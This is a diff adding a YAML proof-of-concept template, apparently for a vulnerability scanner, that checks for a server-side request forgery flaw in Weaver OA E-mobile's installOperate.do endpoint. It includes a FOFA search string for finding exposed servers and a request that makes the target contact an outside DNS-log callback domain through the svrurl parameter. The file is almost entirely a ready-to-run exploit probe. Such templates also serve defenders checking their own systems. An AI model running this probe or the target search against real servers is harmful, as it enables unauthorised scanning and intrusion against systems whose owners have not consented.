@@ -1,0 +1,17 @@
+id: poc-yaml-weaver-e-mobile-installoperate-do-ssrf
+info:
+  name: 泛微OA E-mobile installOperate.do SSRF漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - ssrf
+  finger: e-mobile
+  fofa: header="EMobileServer"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /install/installOperate.do?svrurl=http://{{.domain}}
+  expression: reverse.Verify()
+transport: http
